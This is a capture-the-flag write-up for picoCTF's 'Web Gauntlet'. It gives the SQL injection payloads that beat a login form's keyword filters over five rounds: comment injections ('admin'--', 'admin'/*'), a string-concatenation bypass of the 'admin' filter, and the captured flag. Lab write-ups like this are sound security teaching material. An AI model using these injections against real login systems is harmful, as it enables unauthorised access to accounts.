### Web Gauntlet

http://jupiter.challenges.picoctf.org:42961/index.php

http://jupiter.challenges.picoctf.org:42961/filter.php

SQL Injection challenge where one must bypass increasingly difficult filters

query structure 
```sql
SELECT * FROM users WHERE username='' AND password=''
```

#### Round 1

filters: actually completed this before checking :s

bypassed by a username of `admin'--` to comment out the rest of the query

```sql
SELECT * FROM users WHERE username='admin'--' AND password=''
```

#### Round 2

filters `Round2: or and like = --`


this is bypassed by a username of `admin'/*` inline comment removes the rest of the query as we can't use `--` anymore with the new filter

```sql
SELECT * FROM users WHERE username='admin'/*' AND password=''
```

#### Round 3

filters `Round3: or and = like > < --`


feel like this isn't intended but oh well, same inline comment bypass works again `admin'/*` 

```sql
SELECT * FROM users WHERE username='admin'/*' AND password=''
```

#### Round 4

filters `Round4: or and = like > < -- admin`


used string concatenation to bypass admin filter `ad'||'min'/*` 

```sql
SELECT * FROM users WHERE username='ad'||'min'/*' AND password=''
```

#### Round 5

filters `Round5: or and = like > < -- admin union`


same again, feel like this maybe wasn't intended haha `ad'||'min'/*` 

```sql
SELECT * FROM users WHERE username='ad'||'min'/*' AND password=''
```

flag picoCTF{y0u_m4d3_1t_96486d415c04a1abbbcf3a2ebe1f4d02}

